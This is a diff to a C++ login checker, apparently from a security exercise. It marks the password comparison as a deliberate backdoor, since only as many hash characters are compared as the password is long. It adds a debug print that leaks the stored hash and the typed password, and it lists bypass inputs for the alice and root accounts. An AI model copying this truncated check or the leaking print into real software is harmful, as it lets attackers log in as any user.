@@ -67,6 +67,8 @@ bool checkUserPass(string &l_user, string &l_password)
     if (strncmp(user.c_str(), l_user.c_str(), user.size()) == 0)
     {
       // compare the hashed passwords. return true if they match
+      // here is the bakdoor, since we only compare the number of characters inputed as passwords (must be >8). 
+      std::cout << "password_file:" << password << "password_input:" << l_password << "input_size:" << l_password.size();
       return (strncmp(password.c_str(), sha256(l_password).c_str(), l_password.size()) == 0) ? true : false;
     }
   }
@@ -115,3 +117,8 @@ int main()
   sanitizeInput(username, password);
   checkUserPass(username, password) ? authenticated(username) : rejected(username);
 }
+
+// find a string that has a hash which is the same for the first 8 characters with alices hash: 5ef2c394d5b63e4175cd331c74c8453c3e36eb8f47f6d648397ff6c1314fd705
+//password that works for alice: abf74i8z
+// find a string that has a hash which is the same for the first 8 characters with root hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+//password that works for root: abb0tsdt
